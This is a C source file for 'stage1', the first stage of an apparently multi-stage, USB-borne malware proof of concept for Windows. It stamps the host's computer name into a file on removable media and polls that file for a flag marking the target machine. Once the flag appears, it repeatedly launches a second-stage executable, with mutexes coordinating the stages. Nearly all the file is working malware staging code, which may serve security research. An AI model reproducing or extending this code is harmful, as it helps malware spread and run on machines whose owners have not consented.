// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com

/*
stage1 - MIT License - Copyright 2020
-
David Reguera Garcia aka Dreg - dreg@fr33project.org
-
http://www.rootkit.es/
http://github.com/David-Reguera-Garcia-Dreg/
http://www.fr33project.org/
-
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

WARNING! this is a POC, the code is CRAP
*/

#include "com.h"
#include <stdio.h>
#include <windows.h>
#define COMSRC // ONLY DEFINE THIS ONE TIME IN THE FULL PROJECT, THE OTHERS MUST BE USED ONLY: #include <comsrc.h>
#include <comsrc.h>

char curr_dir[MAX_PATH];
char cmdex[MAX_PATH * 2];
char shex[MAX_PATH * 2];

DWORD WINAPI execf(LPVOID lpParameter)
{
    ShellExecuteA(NULL, "open", shex, NULL, curr_dir, SW_SHOWNORMAL);

    return 0;
}

int stage1(int argc, char* argv[])
{
    FILE* file = NULL;
    int retf = 1;

    puts("\n-\n"
         "stage1 (MIT LICENSE) by David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
         "http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg\n"
         "-\n");

    HANDLE hMutexHandle = CreateMutexW(NULL, FALSE, STAGE1_MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return 1;
    }

    HANDLE openned_mutex = NULL;

    openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, STAGE2_MUTEX_NAME);
    if (NULL != openned_mutex)
    {
        CloseHandle(openned_mutex);
        return 1;
    }

    get_cmdex_shex_curr_dir(cmdex, shex, curr_dir);

    char letter = get_root_letter_from_path(cmdex);
    printf("%c:\\\n", letter);
    puts(cmdex);
    puts(shex);
    puts(curr_dir);

    do
    {
        puts("trying to start FIRST STAGE....");
        file = fopen(cmdex, "rb+");
        if (NULL != file)
        {
#define MAX_SIZE_CMPNAME 1000
            DWORD size_computer_name = MAX_SIZE_CMPNAME;
            static char computer_name[MAX_SIZE_CMPNAME + 1];

            if (GetComputerNameA(computer_name, &size_computer_name))
            {
                puts(computer_name);

                fseek(file, 0L, SEEK_SET);
                fwrite(computer_name, strlen(computer_name), 1, file);
            }

            fflush(file);
            fclose(file);

            FILE* hfile = NULL;
            char rd_bff[3] = { 0 };
            do
            {
                puts("checking if i am in target machine...");
                Sleep(5000);
                hfile = fopen(cmdex, "rb");
                if (NULL != hfile)
                {
                    fread(rd_bff, 2, 1, hfile);
                    fclose(hfile);
                    if (R_FILE_STAGE2_FLAG == rd_bff[0])
                    {
                        puts("\n malware in mass storage, I am in target machine!!");
                        do
                        {
                            printf("trying execute: %s\n", shex);
                            Sleep(3000);
                            CloseHandle(CreateThread(NULL, 0, execf, NULL, 0, NULL));

                            openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, STAGE2_MUTEX_NAME);
                            if (NULL != openned_mutex)
                            {
                                CloseHandle(openned_mutex);
                                retf = 0;
                                goto endfc;
                            }

                        } while (1);
                    }
                    else
                    {
                        Sleep(3000);
                    }
                }
                else
                {
                    perror(cmdex);
                }

                openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, STAGE2_MUTEX_NAME);
                if (NULL != openned_mutex)
                {
                    CloseHandle(openned_mutex);
                    retf = 1;
                    goto endfc;
                }
            } while (1);
        }
        else
        {
            perror(cmdex);
            Sleep(3000);
        }

        openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, STAGE2_MUTEX_NAME);
        if (NULL != openned_mutex)
        {
            CloseHandle(openned_mutex);
            retf = 1;
            goto endfc;
        }
    } while (1);


endfc:

    if (retf == 0)
    {
        puts("\nsuccess!\n");
    }
    else
    {
        puts("\nsome error!\n");
    }

    puts("\nclosing in 5 secs...");
    Sleep(5000);

    return retf;
}

int main(int argc, char* argv[])
{
    int retf;

    puts("stage1\n");
    retf = stage1(argc, argv);

    puts("\nPRESS ENTER TO EXIT\n");
    getchar();

    return retf;
}